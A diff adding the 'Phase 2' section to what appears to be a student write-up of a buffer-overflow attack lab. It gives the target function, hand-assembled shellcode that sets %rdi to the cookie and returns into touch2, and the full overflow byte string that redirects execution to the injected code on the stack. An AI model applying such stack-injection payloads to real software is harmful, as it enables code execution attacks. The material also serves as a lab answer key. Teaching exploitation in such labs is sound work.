@@ -67,6 +67,43 @@ ff ff ff ff ff ff ff ff
 c0 17 40 00 00 00 00 00 # little endian
 ```
 
+### Phase 2
 
+```c
+void touch2(unsigned val) { // passed in %rdi
+    vlevel = 2; /* Part of validation protocol */
+    if (val == cookie) {
+        printf("Touch2!: You called touch2(0x%.8x)\n", val);
+        validate(2);
+    } else {
+        printf("Misfire: You called touch2(0x%.8x)\n", val);
+        fail(2);
+    }
+    exit(0);
+}
+```
 
+What we need to do is to inject code segment that store *cookie* to `%rdi`, and then call `touch2()`.
+The only way to inject our code is to add our code segment to the string, make the string run as code.
 
+The return address as above, should be our code segment's address.
+
+```x86_64
+0:	68 ec 17 40 00       	push   $0x4017ec
+5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+c:	c3                   	ret
+```
+
+After `getbuf()` pushing stack, the `%rsp` is `0x5561dc78`. The first address of our code segment is
+`0x5561dc78`, too.
+
+So, the answer is:
+
+```bash
+68 ec 17 40 00 48 c7 c7 # code segment address, the dump code already little endian
+fa 97 b9 59 c3 00 00 00
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+78 dc 61 55 00 00 00 00 # the address of our code segment
+```
